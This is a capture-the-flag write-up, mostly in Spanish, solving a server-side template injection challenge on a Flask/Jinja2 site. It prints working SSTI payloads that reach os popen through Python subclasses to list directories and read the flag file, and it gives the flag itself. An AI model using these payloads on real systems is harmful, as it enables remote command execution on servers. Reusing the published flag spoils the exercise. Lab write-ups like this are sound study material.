## Descripción

I made a cool website where you can announce whatever you want! Try it out! I heard templating is a cool and modular way to build web apps! Check out my website [here](http://xebec.cylabacademy.net:43259/)! HINTS 1 Server Side Template Injection

## Solución

```
{{ ''.__class__.__mro__[1].__subclasses__() }}


{% for x in ''.__class__.__mro__[1].__subclasses__() %}{% if x.__name__ == '_wrap_close' %}{{ x }} -- index: {{ loop.index0 }}{% endif %}{% endfor %}

{{ ''.__class__.__mro__[1].__subclasses__()[155].__init__.__globals__['popen']('ls /').read() }}

{{ ''.__class__.__mro__[1].__subclasses__()[155].__init__.__globals__['popen']('ls /').read() }}

{{ ''.__class__.__mro__[1].__subclasses__()[155].__init__.__globals__['popen']('ls -la /challenge').read() }}


{{ ''.__class__.__mro__[1].__subclasses__()[155].__init__.__globals__['popen']('cat /challenge/flag').read() }}

# academy{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_882dc002}
```

Con la pista nos dimos cuenta que podemos enviar comando a ejecutar en el codigo con {{...}} dobles llaves asi que metemos el comando usando el config confirmamos que lenguaje es <Config {'DEBUG': False, 'TESTING': False, 'PROPAGATE_EXCEPTIONS': None, 'SECRET_KEY': None, 'PERMANENT_SESSION_LIFETIME': datetime.timedelta(days=31), 'USE_X_SENDFILE': False, 'SERVER_NAME': None, 'APPLICATION_ROOT': '/', 'SESSION_COOKIE_NAME': 'session', 'SESSION_COOKIE_DOMAIN': None, 'SESSION_COOKIE_PATH': None, 'SESSION_COOKIE_HTTPONLY': True, 'SESSION_COOKIE_SECURE': False, 'SESSION_COOKIE_SAMESITE': None, 'SESSION_REFRESH_EACH_REQUEST': True, 'MAX_CONTENT_LENGTH': None, 'SEND_FILE_MAX_AGE_DEFAULT': None, 'TRAP_BAD_REQUEST_ERRORS': None, 'TRAP_HTTP_EXCEPTIONS': False, 'EXPLAIN_TEMPLATE_LOADING': False, 'PREFERRED_URL_SCHEME': 'http', 'TEMPLATES_AUTO_RELOAD': None, 'MAX_COOKIE_SIZE': 4093}>

viendo esta informacion confirmamos que es python y corremos el siguiente comando para ver las clases

{{ ''.**class**.**mro**[1].**subclasses**() }}

Buscaremos una clase en especifico en este caso popen o alguna otra que nos ayude a ejecutar comandos de alguna manera en este caso salio os para correr comandos utilizamos el siguiente comando para saber donde se encuentra {% for x in ''.**class**.**mro**[1].**subclasses**() %}{% if x.**name** == '_wrap_close' %}{{ x }} -- index: {{ loop.index0 }}{% endif %}{% endfor %} Aparecera una clase y debe hablar de Index tal numero y ahora teniendo el index ejecutamos {{ ''.**class**.**mro**[1].**subclasses**()[155].**init**.**globals**['popen']('ls /').read() }} que nos mostrara carpetas la que mas destaca es challenge asi que entramos ahi con

{{ ''.**class**.**mro**[1].**subclasses**()[155].**init**.**globals**['popen']('ls -la /challenge').read() }}

que nos mostrara que exite un archivo flag entonces ejecutamos

{{ ''.**class**.**mro**[1].**subclasses**()[155].**init**.**globals**['popen']('cat /challenge/flag').read() }}

finalmente obtenemos la bandera academy{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_882dc002}

## Notas adicionales

## Referencias

https://medium.com/@hareemkhanNED/writeup-ssti1-picoctf-2025-3efd45283c83